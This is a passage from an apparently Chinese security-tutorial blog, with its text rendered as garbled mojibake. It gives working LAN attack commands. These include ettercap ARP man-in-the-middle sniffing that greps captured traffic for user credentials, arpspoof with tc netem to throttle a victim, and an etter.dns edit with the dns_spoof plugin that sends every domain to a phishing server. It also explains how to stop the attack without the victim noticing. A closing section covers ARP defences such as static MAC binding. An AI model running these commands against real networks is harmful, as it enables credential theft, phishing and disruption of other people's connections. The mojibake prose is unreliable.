class="number">5</span>ã€åœ¨å³ä¸Šè§’çš„åœ°çƒçš„æŒ‰é’®æ˜¯æ”»å‡»åˆ—è¡¨ï¼Œå°±å¯ä»¥è¿›è¡Œå¯¹é¶æœºçš„æŠ“åŒ…ã€‚</span><br><span class="line">é€šè¿‡ã€arp -a | findstr <span class="number">192.168</span>.<span class="number">1.1</span>ã€‘æ¥æŸ¥çœ‹æ˜¯å¦æ¯’åŒ–</span><br><span class="line"><span class="number">6</span>ã€å³è¾¹çš„ç›®æ ‡æ˜¯åœæ­¢æŒ‰é’®ï¼Œå·¦è¾¹æœ‰æš‚åœæ‰«ææŒ‰é’®ã€‚å…ˆåœæ­¢ARPæ”»å‡»ï¼Œå†åœæ­¢æ•°æ®è½¬å‘ã€‚</span><br><span class="line">æ³¨æ„ï¼šæƒ³åœæ­¢æ”»å‡»çš„æ—¶å€™ï¼Œè¦å…ˆè¿›è¡Œå³è¾¹çš„åœæ­¢æŒ‰é’®ï¼Œåœ¨è¿›è¡Œå·¦è¾¹çš„æš‚åœæ‰«ææŒ‰é’®ã€‚è¿™æ ·é¶æœºæ˜¯ä¸ä¼šæœ‰ä»»ä½•çš„å¯Ÿè§‰çš„ã€‚</span><br><span class="line">å¦‚æœå…ˆè¿›è¡Œå·¦è¾¹çš„æš‚åœæ‰«æï¼Œå°±ç›¸å½“äºå‘èµ·äº†ARPæ–­ç½‘æ”»å‡»ï¼Œä¼šè¢«å¯¹æ–¹å¯Ÿè§‰ã€‚</span><br></pre></td></tr></table></figure><h3 id="4ã€Ettercapåˆ©ç”¨å‘½ä»¤è¡Œæ”»å‡»"><a href="#4ã€Ettercapåˆ©ç”¨å‘½ä»¤è¡Œæ”»å‡»" class="headerlink" title="4ã€Ettercapåˆ©ç”¨å‘½ä»¤è¡Œæ”»å‡»"></a>4ã€Ettercapåˆ©ç”¨å‘½ä»¤è¡Œæ”»å‡»</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€è¿è¡Œå‘½ä»¤è®²è§£ï¼šå¥½åƒä¸éœ€è¦å¼€å¯ç«¯å£è½¬å‘</span><br><span class="line">ettercap -i -eth0 -Tq -M arp:remote /<span class="title function_ invoke__">ip</span>(host)<span class="comment">//net gatmask/ &gt;&gt;b.txt</span></span><br><span class="line">Tï¼šæŒ‡çš„æ˜¯textæ–‡æœ¬æ¨¡å¼</span><br><span class="line">qï¼šæŒ‡çš„æ˜¯å®‰é™æ¨¡å¼æ‰§è¡Œè¿™ä¸ªå‘½ä»¤</span><br><span class="line">iï¼šåé¢è·Ÿçš„æ˜¯è¿æ¥å±€åŸŸç½‘çš„ç½‘å¡</span><br><span class="line">Mï¼šåé¢è·Ÿçš„æ˜¯æŒ‡å®šä½¿ç”¨arpçš„æ–¹å¼</span><br><span class="line">&gt;&gt;ï¼šè¾“å‡ºæ–‡ä»¶</span><br><span class="line"><span class="number">2</span>ã€æ”»å‡»å‘½ä»¤</span><br><span class="line">æ”»å‡»ï¼šettercap -Tq -i eth0 -M arp:remote /<span class="number">192.168</span>.<span class="number">110.1</span>(ç½‘å…³IP)<span class="comment">// /192.168.110.11// &gt;&gt;b.txt</span></span><br><span class="line">åªä¼šå°†æŠ“å–çš„åŒ…è¾“å‡ºåˆ°b.txtæ–‡ä»¶ä¸­ï¼Œä¸èƒ½å®æ—¶è¿›è¡Œæ•°æ®åˆ†æï¼Œåªèƒ½ä»b.txtæ–‡ä»¶ä¸­è¿›è¡Œåˆ†æ</span><br><span class="line">ç›‘å¬ï¼štail -f b.txt</span><br><span class="line">ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨è¿™ç§å‘½ä»¤åŒæ—¶çš„åœ¨å¦ä¸€ä¸ªçª—å£ä¸­è¿›è¡Œå¯¹b.txtæ–‡ä»¶è¿›è¡Œç›‘å¬ï¼Œå°±å¯ä»¥èµ·åˆ°å®æ—¶ç›‘å¬çš„æ•ˆæœ</span><br><span class="line">å‡çº§ç›‘å¬ï¼štail -f b.txt | grep <span class="string">&quot;USER&quot;</span></span><br><span class="line">æˆ–è€…</span><br><span class="line">tail -f b.txt | grep <span class="string">&quot;CONTENT&quot;</span></span><br><span class="line">æˆ–è€…</span><br><span class="line">tail -f b.txt | egrep <span class="string">&quot;USER|CONTENT&quot;</span></span><br><span class="line">åœæ­¢æ”»å‡»ï¼šctrl+c</span><br><span class="line">ä¿å­˜ç›‘å¬ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶ï¼šå°±æ˜¯å¯¹æ—¥å¿—è¿›è¡Œä¸€ä¸ªä¿å­˜</span><br><span class="line">cat -n b.txt | egrep <span class="string">&quot;USER|CONTENT&quot;</span> &gt;arp.log</span><br><span class="line">-n:æ·»åŠ è¡Œå·</span><br><span class="line">egrepï¼šè¿‡æ»¤è§„åˆ™</span><br><span class="line">&gt;:è¾“å‡ºæ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="å…­ã€ARPé™åˆ¶ç½‘é€Ÿæ”»å‡»"><a href="#å…­ã€ARPé™åˆ¶ç½‘é€Ÿæ”»å‡»" class="headerlink" title="å…­ã€ARPé™åˆ¶ç½‘é€Ÿæ”»å‡»"></a>å…­ã€ARPé™åˆ¶ç½‘é€Ÿæ”»å‡»</h2><h3 id="1ã€TCå·¥å…·ä»‹ç»"><a href="#1ã€TCå·¥å…·ä»‹ç»" class="headerlink" title="1ã€TCå·¥å…·ä»‹ç»"></a>1ã€TCå·¥å…·ä»‹ç»</h3><p>åœ¨Linuxä¸­ï¼Œæµé‡æ§åˆ¶éƒ½æ˜¯é€šè¿‡TCè¿™ä¸ªå·¥å…·æ¥å®Œæˆçš„ã€‚é€šå¸¸ï¼Œè¦å¯¹ç½‘å¡è¿›è¡Œæµé‡æ§åˆ¶çš„é…ç½®ï¼Œéœ€è¦è¿›è¡Œå¦‚ä¸‹çš„æ­¥éª¤ï¼š</p><ol><li><p>ä¸ºç½‘å¡é…ç½®ä¸€ä¸ªé˜Ÿåˆ—</p></li><li><p>åœ¨è¯¥é˜Ÿåˆ—ä¸­å»ºç«‹åˆ†ç±»</p></li><li><p>æ ¹æ®éœ€è¦å»ºç«‹å­é˜Ÿå’Œå­åˆ†ç±»</p></li><li><p>ä¸ºæ¯ä¸ªåˆ†ç±»å»ºç«‹è¿‡æ»¤å™¨</p></li><li><p>æ³¨æ„ï¼šåœ¨TCä¸­ä½¿ç”¨ä¸‹åˆ—çš„ç¼©å†™è¡¨ç¤ºç›¸åº”çš„ç½‘ç»œå»¶è¿Ÿï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æ—¶é—´çš„è®¡é‡å•ä½ï¼š</span><br><span class="line">sã€secæˆ–è€…secsç§’</span><br><span class="line">msã€msecæˆ–è€…msecsæ¯«ç§’</span><br><span class="line">usã€usecã€usecsæˆ–è€…ä¸€ä¸ªæ— å•ä½æ•°å­—å¾®ç§’</span><br></pre></td></tr></table></figure></li></ol><h3 id="2ã€TCå‘½ä»¤ä»‹ç»"><a href="#2ã€TCå‘½ä»¤ä»‹ç»" class="headerlink" title="2ã€TCå‘½ä»¤ä»‹ç»"></a>2ã€TCå‘½ä»¤ä»‹ç»</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€é™åˆ¶ç½‘é€Ÿ<span class="number">200</span>mså»¶æ—¶</span><br><span class="line">tc qdisc add eth0 root netem delay <span class="number">200</span>ms</span><br><span class="line">qdiscï¼šæ’é˜Ÿæ—¶é—´</span><br><span class="line">addï¼šæ·»åŠ </span><br><span class="line">devï¼šè®¾å¤‡ï¼ˆç½‘å¡ï¼‰</span><br><span class="line">rootï¼šrootç”¨æˆ·èº«ä»½</span><br><span class="line">netem delayï¼šè®¾ç½®ç½‘ç»œå»¶æ—¶æ—¶é—´</span><br><span class="line"><span class="number">2</span>ã€å–æ¶ˆé™åˆ¶ç½‘é€Ÿ<span class="number">200</span>mså»¶æ—¶</span><br><span class="line">tc qdisc del dev eth0 root netem delay <span class="number">200</span>ms</span><br><span class="line">delï¼šåˆ é™¤</span><br><span class="line"><span class="number">3</span>ã€ä¿®æ”¹ç½‘ç»œå»¶æ—¶</span><br><span class="line">tc qdisc change dev eth0 root netem delay <span class="number">300</span>ms</span><br><span class="line">changeï¼šä¿®æ”¹</span><br></pre></td></tr></table></figure><h3 id="3ã€ARPæ”»å‡»é™åˆ¶ç½‘é€Ÿçš„å…·ä½“æ­¥éª¤"><a href="#3ã€ARPæ”»å‡»é™åˆ¶ç½‘é€Ÿçš„å…·ä½“æ­¥éª¤" class="headerlink" title="3ã€ARPæ”»å‡»é™åˆ¶ç½‘é€Ÿçš„å…·ä½“æ­¥éª¤"></a>3ã€ARPæ”»å‡»é™åˆ¶ç½‘é€Ÿçš„å…·ä½“æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€å¼€å¯ç«¯å£è½¬å‘</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward<span class="comment">//å€¼ä¸º0è¡¨ç¤ºæ²¡å¼€å¯æµé‡è½¬å‘ï¼Œä¸º1è¡¨ç¤ºå¼€å¯</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward<span class="comment">//å¼€å¯æµé‡è½¬å‘</span></span><br><span class="line"><span class="number">2</span>ã€å¼€å¯ARPæ”»å‡»</span><br><span class="line">arpspoof -i eth0 -r ç½‘å…³IP192.<span class="number">168.1</span>.<span class="number">1</span> -t é¶æœºIP192.<span class="number">18.1</span>.<span class="number">136</span></span><br><span class="line"><span class="number">3</span>ã€æŸ¥çœ‹é¶æœºå½“å‰çš„ç½‘é€Ÿ</span><br><span class="line">https:<span class="comment">//www.speedtest.cn</span></span><br><span class="line"><span class="number">4</span>ã€å¼€å¯ç½‘ç»œå»¶è¿Ÿé™é€Ÿ</span><br><span class="line">tc qdisc add dev eth0 root netem delay <span class="number">500</span>ms</span><br><span class="line"><span class="number">5</span>ã€æŸ¥çœ‹é™é€Ÿè§„åˆ™</span><br><span class="line">tc qdisc show</span><br><span class="line"><span class="number">6</span>ã€æŸ¥çœ‹é¶æœºå½“å‰çš„ç½‘é€Ÿ</span><br><span class="line">https:<span class="comment">//www.speedtest.cn7ã€ä¿®æ”¹ç½‘é€Ÿé™åˆ¶</span></span><br><span class="line">tc qdisc change dev eth0 root netem delay <span class="number">800</span>ms<span class="comment">//æ—¶é—´è¶Šå°å¯¹ç½‘é€Ÿé™åˆ¶è¶Šå¤§ï¼Œæ—¶é—´è¶Šå¤§ï¼Œé™é€Ÿè¶Šå¤§</span></span><br><span class="line"><span class="number">8</span>ã€æŸ¥çœ‹é™é€Ÿè§„åˆ™</span><br><span class="line">tc qdisc show</span><br><span class="line"><span class="number">9</span>ã€æŸ¥çœ‹é¶æœºå½“å‰ç½‘é€Ÿ</span><br><span class="line">https:<span class="comment">//www.speedtest.cn</span></span><br><span class="line"><span class="number">10</span>ã€å–æ¶ˆé™åˆ¶ç½‘é€Ÿ<span class="number">200</span>mså»¶æ—¶</span><br><span class="line">tc qdisc del dev eth0 root netem delay <span class="number">200</span>ms</span><br></pre></td></tr></table></figure><h3 id="4ã€é™é€ŸåŸç†è®²è§£"><a href="#4ã€é™é€ŸåŸç†è®²è§£" class="headerlink" title="4ã€é™é€ŸåŸç†è®²è§£"></a>4ã€é™é€ŸåŸç†è®²è§£</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ARPæ”»å‡»ä¹‹å‰ï¼šé¶æœºé€šè¿‡è·¯ç”±å™¨è½¬äº¤ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å°†æ•°æ®è½¬äº¤ç»™æˆ‘ä»¬çš„è·¯ç”±å™¨ï¼Œå†ç”±è·¯ç”±å™¨è½¬äº¤ç»™é¶æœº</span><br><span class="line">ARPæ”»å‡»ä¹‹åï¼šé¶æœºå°†ä¸Šç½‘è¯·æ±‚è½¬å‘ç»™æ”»å‡»æœºï¼Œæ”»å‡»æœºå¼€å¯äº†æ•°æ®è½¬å‘ï¼Œå°†æ•°æ®è½¬å‘ç»™è·¯ç”±å™¨ï¼Œå†ç”±è·¯ç”±å™¨è½¬å‘ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨å°†æ•°æ®è½¬å‘ç»™è·¯ç”±å™¨ï¼Œè·¯ç”±å™¨è½¬å‘ç»™æ”»å‡»æœºï¼Œæ”»å‡»æœºå†è½¬å‘ç»™é¶æœºã€‚</span><br><span class="line">é™é€Ÿä¹‹å‰ï¼šé¶æœºå°†æ•°æ®å‘é€åˆ°æ”»å‡»æœºï¼Œé€šè¿‡é˜Ÿåˆ—ç›´æ¥è½¬å‘åˆ°è·¯ç”±å™¨ï¼Œä¸è€—æ—¶ã€‚</span><br><span class="line">é™é€Ÿä¹‹åï¼šé¶æœºå°†æ•°æ®å‘é€åˆ°æ”»å‡»æœºï¼Œéœ€è¦å…ˆåœ¨é˜Ÿåˆ—ä¸­è¿›è¡Œ<span class="number">500</span>msçš„å»¶æ—¶æ’é˜Ÿæ‰èƒ½é€šè¿‡</span><br></pre></td></tr></table></figure><h2 id="ä¸ƒã€ARP-DNSæ¬ºéª—"><a href="#ä¸ƒã€ARP-DNSæ¬ºéª—" class="headerlink" title="ä¸ƒã€ARP-DNSæ¬ºéª—"></a>ä¸ƒã€ARP-DNSæ¬ºéª—</h2><h3 id="1ã€DNSæ¦‚å¿µï¼š"><a href="#1ã€DNSæ¦‚å¿µï¼š" class="headerlink" title="1ã€DNSæ¦‚å¿µï¼š"></a>1ã€DNSæ¦‚å¿µï¼š</h3><p>DNSç§°ä¹‹ä¸ºåŸŸåç³»ç»Ÿã€‚æœ¬åœ°é»˜è®¤å ç”¨53ç«¯å£ï¼Œå®ƒæœ¬èº«çš„å®è´¨ä¸Šæ˜¯ä¸€ä¸ªåŸŸåå’Œipçš„æ•°æ®åº“æœåŠ¡å™¨ï¼Œä»–è¦å®Œæˆçš„ä»»åŠ¡å°±æ˜¯å¸®æˆ‘ä»¬æŠŠè¾“å…¥çš„åŸŸåè½¬æ¢æˆipåœ°å€ï¼Œä¹‹åé€šè¿‡ipå¯»å€è¿æ¥ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>åœ¨æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥åœ°å€ä¹‹åä¼šï¼š</p><ol><li>ç¬¬ä¸€é¦–å…ˆåœ¨DNSç¼“å­˜è¡¨ä¸­è¿›è¡Œå¯»æ‰¾ï¼Œç¬¬äºŒåœ¨hosté…ç½®è¡¨ä¸­è¿›è¡ŒæŸ¥æ‰¾ï¼Œç¬¬ä¸‰å»DNSæœåŠ¡å™¨ä¸­è¿›è¡ŒæŸ¥æ‰¾ã€‚</li><li>ç»‘å®šçš„æœ€è¿‘çš„DNSæœåŠ¡å™¨ç»‘å®šåŸŸåæ—¶ï¼ŒæœåŠ¡å™¨ä¼šå‘Šè¯‰DNSæœåŠ¡å™¨å½“å‰ç»‘å®šçš„ipæ˜¯å¤šå°‘ã€‚</li><li>å¦‚æœæœ€è¿‘çš„DNSæœåŠ¡å™¨æ²¡æœ‰çš„è¯ï¼Œä¼šå°†è¿™ä¸ªé—®é¢˜å‘é€åˆ°å…¶ä»–çš„DNSæœåŠ¡å™¨è¿›è¡Œè¯¢é—® ã€‚</li><li>ç„¶åé€šè¿‡ipåœ°å€æ‰¾åˆ°ä½ çš„MACåœ°å€ï¼Œé€šè¿‡MACåœ°å€è¿›è¡Œé€šè®¯ã€‚</li></ol><h3 id="2ã€DNSåŠ«æŒ"><a href="#2ã€DNSåŠ«æŒ" class="headerlink" title="2ã€DNSåŠ«æŒ"></a>2ã€DNSåŠ«æŒ</h3><p>åˆç§°ä¹‹ä¸ºåŸŸååŠ«æŒï¼Œå°†ç›®æ ‡çš„DNSè¯¢é—®è¯·æ±‚è¿›è¡ŒåŠ«æŒï¼Œåªèƒ½å¯¹ç½‘å…³å’Œé¶æœºè¿›è¡Œæ¬ºéª—ã€‚</p><p>å±å®³ï¼šèƒ½è¿›è¡Œé’“é±¼ç­‰ï¼Œè®©é¶æœºè¯¢é—®å‡ç½‘å€ã€‚</p><p>ettercapåŠ«æŒçš„åŸç†ï¼šå±€åŸŸç½‘åŠ«æŒï¼Œæ”»å‡»è€…é€šè¿‡ä¼ªè£…æˆç½‘å…³ï¼ŒåŠ«æŒå—å®³è€…çš„ç½‘ç»œè¯·æ±‚ï¼Œå°†ç½‘ç»œè¯·æ±‚æ‹¦æˆªåˆ°æŒ‡å®šçš„æœåŠ¡å™¨</p><h3 id="3ã€ARP-DNSå¸¸ç”¨å‘½ä»¤ï¼ˆwinï¼‰"><a href="#3ã€ARP-DNSå¸¸ç”¨å‘½ä»¤ï¼ˆwinï¼‰" class="headerlink" title="3ã€ARP-DNSå¸¸ç”¨å‘½ä»¤ï¼ˆwinï¼‰"></a>3ã€ARP-DNSå¸¸ç”¨å‘½ä»¤ï¼ˆwinï¼‰</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€æŸ¥çœ‹DNSç¼“å­˜è¡¨ï¼šipconfig /displaydns</span><br><span class="line"><span class="number">2</span>ã€è·å–DNSåœ°å€ï¼šping www.mashibing.com</span><br><span class="line"><span class="number">3</span>ã€åˆ·æ–°/åˆ é™¤DNSç¼“å­˜ï¼šipconfig /flushdns</span><br><span class="line">å¦‚æœæœ‰<span class="number">192</span>ç­‰å±€åŸŸç½‘å¼€å¤´çš„DNSç¼“å­˜å°±è¯´æ˜å¯èƒ½è¢«DNSæ”»å‡»äº†ã€‚</span><br></pre></td></tr></table></figure><h3 id="4ã€ARP-DNSæ¬ºéª—æ”»å‡»æ­¥éª¤"><a href="#4ã€ARP-DNSæ¬ºéª—æ”»å‡»æ­¥éª¤" class="headerlink" title="4ã€ARP-DNSæ¬ºéª—æ”»å‡»æ­¥éª¤"></a>4ã€ARP-DNSæ¬ºéª—æ”»å‡»æ­¥éª¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€kaliå¼€å¯apacheæœåŠ¡ï¼ˆkaliè‡ªå¸¦ï¼‰ï¼šservice apache2 start</span><br><span class="line"><span class="number">2</span>ã€è®¿é—®apacheä¸»é¡µæŸ¥çœ‹apacheæ˜¯å¦å¼€å¯ï¼šæµè§ˆå™¨è¾“å…¥æœ¬æœºåœ°å€</span><br><span class="line"><span class="number">3</span>ã€ç¼–è¾‘ettercapé…ç½®æ–‡ä»¶ï¼š</span><br><span class="line"><span class="number">1</span>ã€è¿›å…¥cd /etc/ettercap</span><br><span class="line"><span class="number">2</span>ã€å¤åˆ¶åŸæœ‰çš„é…ç½®æ–‡ä»¶ï¼ˆç¯å¢ƒæ¢å¤æ¯”è¾ƒæ–¹ä¾¿ï¼‰ï¼šcp etter.dns etter.dns1</span><br><span class="line"><span class="number">3</span>ã€è®¾ç½®dnsåŠ«æŒé…ç½®æ–‡ä»¶ï¼švi /etc/ettercap/etter.dns åœ¨æ–‡ä»¶æœ€åæ·»åŠ ä»¥ä¸‹å†…å®¹</span><br><span class="line">*   A   <span class="number">192.168</span>.<span class="number">110.12</span></span><br><span class="line">*   PTR <span class="number">192.168</span>.<span class="number">110.12</span></span><br><span class="line">www.*.com  A <span class="number">192.168</span>.<span class="number">110.12</span><span class="comment">//å°†æ‰€æœ‰www.*.comè¿™ç§çš„ä¹ŸæŒ‡å‘192.168.110.12</span></span><br><span class="line">wqä¿å­˜</span><br><span class="line">å‚æ•°</span><br><span class="line">*:ä»£è¡¨æ‰€æœ‰çš„ç½‘ç«™ ä¹Ÿå¯è®¾ç½®æŸä¸ªç½‘ç«™ www.mashibing.com</span><br><span class="line">A:ä»£è¡¨é’“é±¼çš„ipåœ°å€</span><br><span class="line">PTR ï¼šå¸¸è¢«ç”¨äºåå‘åœ°å€è§£æ</span><br><span class="line"><span class="number">4</span>ã€ettercapåŠ«æŒå‘½ä»¤è®²è§£</span><br><span class="line"> ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /è¢«æ”»å‡»è€…ip<span class="comment">// /è¢«æ”»å‡»è€…ç½‘å…³// </span></span><br><span class="line"> -iï¼šç½‘å¡</span><br><span class="line"> -Tï¼šæ–‡æœ¬æ¨¡å¼</span><br><span class="line"> -qï¼šå®‰é™æ¨¡å¼</span><br><span class="line"> -Mï¼šæ‰§è¡Œmitmæ”»å‡»</span><br><span class="line"> -Pï¼šplugin å¼€å§‹è¯¥æ’ä»¶</span><br><span class="line"><span class="number">5</span>ã€é¶æœºè®¿é—®ä»¥ä¸‹ç½‘ç«™ç¡®è®¤æ˜¯å¦æ­£ç¡®</span><br><span class="line">éšä¾¿è®¿é—®ä¸€ä¸ª å¦‚äº¬ä¸œ</span><br><span class="line">é€šè¿‡ping/dnsæŸ¥çœ‹ æŸ¥çœ‹dnsæ˜¯å¦æ­£ç¡®</span><br><span class="line"><span class="number">6</span>ã€æ‰§è¡ŒåŠ«æŒå‘½ä»¤</span><br><span class="line">ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /<span class="number">192.168</span>.<span class="number">110.11</span><span class="comment">// /192.168.110.1(ç½‘å…³IP)// &gt;&gt; b.txt</span></span><br><span class="line">è¿›è¡Œæ—¥å¿—å®æ—¶åˆ†æï¼štail -f b.txt</span><br><span class="line">ä¸€ä¸ªå‡çº§çš„å®æ—¶æ—¥å¿—åˆ†æï¼štail -f b.txt | grep <span class="string">&quot;USER&quot;</span></span><br><span class="line"><span class="number">7</span>ã€æ³¨æ„ï¼šå¯¹httpsçš„ç½‘ç«™æœ‰å¯èƒ½æ˜¯æ‹¦æˆªä¸ä½ï¼Œæ˜¯æœ‰ä¸€å®šæ¦‚ç‡çš„ã€‚çœ‹è®¿é—®çš„é¡µé¢æœ‰æ²¡æœ‰å®‰å…¨çš„æ£€æµ‹ã€‚</span><br><span class="line"><span class="number">8</span>ã€é€šè¿‡ctrl+cåœæ­¢åŠ«æŒã€‚</span><br><span class="line">ä½†æ˜¯é¶æœºçš„è®¿é—®ä¾ç„¶æœ‰é—®é¢˜ï¼Œè¿™æ˜¯å› ä¸ºé¶æœºçš„dnsç¼“å­˜ä¾æ—§æ˜¯é”™è¯¯çš„ï¼Œéœ€è¦ipconfig /flushdnsè¿›è¡Œä¾æ¬¡åˆ·æ–° ã€‚</span><br><span class="line"><span class="number">9</span>ã€å›å¤kaliç¯å¢ƒçš„æ–‡ä»¶é…ç½®</span><br><span class="line">cd /etc/ettercap</span><br><span class="line">cd etter.dns etter.dns2<span class="comment">//å°†å¸¦æ”»å‡»çš„ä¿å­˜æˆdns2</span></span><br><span class="line">åˆ é™¤æ”»å‡»æ–‡ä»¶ ï¼šrm  etter.dns</span><br><span class="line">å°†ä¹‹å‰å¤åˆ¶çš„é‚£ä¸ªæ–‡ä»¶è¿›è¡Œæ¢å¤ï¼šcp etter.dns1 etter.dns<span class="comment">//å°†ä¸å¸¦ æ”»å‡»çš„dns1å¤åˆ¶æˆdns</span></span><br></pre></td></tr></table></figure><h2 id="å…«ã€ARPé˜²å¾¡æ–¹å¼"><a href="#å…«ã€ARPé˜²å¾¡æ–¹å¼" class="headerlink" title="å…«ã€ARPé˜²å¾¡æ–¹å¼"></a>å…«ã€ARPé˜²å¾¡æ–¹å¼</h2><h3 id="1ã€ARPæ”»å‡»çš„åŸç†"><a href="#1ã€ARPæ”»å‡»çš„åŸç†" class="headerlink" title="1ã€ARPæ”»å‡»çš„åŸç†"></a>1ã€ARPæ”»å‡»çš„åŸç†</h3><p>ARPæ”»å‡»çš„åŸç†æ˜¯å‘ç½‘å…³å’Œé¶æœºä¸åœçš„å‘é€ARPæ¬ºéª—æŠ¥æ–‡ï¼Œè€Œæˆ‘ä»¬çš„è®¡ç®—æœºå’Œç½‘å…³æ˜¯å®æ—¶çš„æ›´æ–°ARPç¼“å­˜è¡¨ï¼Œä»è€Œå‡ºç°å®‰å…¨æ¼æ´ã€‚</p><p>é˜²å¾¡æ–¹æ³•ï¼šæˆ‘ä»¬å¯¹è¿™ç§æ¬ºéª—ä¸ç›¸ä¿¡æˆ–è€…ä¸æ¥å—çš„è¯ï¼Œå°±ä¸ä¼šæœ‰é—®é¢˜ã€‚</p><p>å¯ä»¥ä»ä¸¤æ–¹é¢ä¸‹æ‰‹ï¼š<br>1ã€è®©æˆ‘ä»¬çš„ç”µè„‘ä¸æ¥å—æ¬ºéª—åŒ…<br>2ã€åŠæ—¶æ¥æ”¶åˆ°æ¬ºéª—çš„åŒ…ä¹Ÿä¸è¦ç›¸ä¿¡</p><h3 id="2ã€Windowsé˜²å¾¡"><a href="#2ã€Windowsé˜²å¾¡" class="headerlink" title="2ã€Windowsé˜²å¾¡"></a>2ã€Windowsé˜²å¾¡</h3><p>1ã€å®‰è£…arpé˜²ç«å¢™ï¼šå¦‚360å®‰å…¨å«å£«ä¸­çš„æµé‡é˜²ç«å¢™ã€‚å¯ä»¥è¿½è¸ªæ”»å‡»è€…çš„IPå’ŒMACåœ°å€ã€‚ä¿æŠ¤ARPè¡¨ä¸å—ä¾µå®³</p><p>2ã€è®¾ç½®é™æ€MACåœ°å€é˜²æŠ¤</p><p>ç®€ä»‹ ï¼šARPè¡¨MACåœ°å€ç»‘å®šæœ‰åŠ¨æ€å’Œé™æ€ä¸¤ç§ç±»å‹ã€‚åŠ¨æ€ä¼šå®æ—¶æ›´æ–°ï¼Œä¸å®‰å…¨ï¼›é™æ€æ˜¯é•¿ä¹…ç”Ÿæ•ˆï¼Œä¸ä¼šéšæ—¶é—´ æˆ–è€…é€šçŸ¥è€Œå˜åŒ–ï¼Œå¾ˆå®‰å…¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€ä¸´æ—¶ç»‘å®šï¼Œé‡å¯ä¹‹åä¼šå¤±å»ä¿æŠ¤æ•ˆæœï¼ˆç®¡ç†å‘˜ï¼‰</span><br><span class="line">å…ˆæŸ¥çœ‹ç½‘å…³IPå’ŒMACåœ°å€ï¼šarp -a  | findstr <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line">å†æŸ¥çœ‹ä¸€ä¸‹æœ¬æœºçš„ç½‘å¡</span><br><span class="line"><span class="number">2</span>ã€æŸ¥è¯¢æœ¬åœ°è¿æ¥çš„ç½‘å¡IDå·</span><br><span class="line">netsh i i show in</span><br><span class="line"><span class="number">3</span>ã€ä¸´æ—¶ç»‘å®šmacåœ°å€ï¼Œé‡å¯å¤±æ•ˆ</span><br><span class="line">netsh -c i i add neighbors IDå·(<span class="number">7</span>) ç½‘å…³ip ç½‘å…³macåœ°å€ store=active</span><br><span class="line">neighborsï¼šæ·»åŠ é‚»å±…åœ°å€</span><br><span 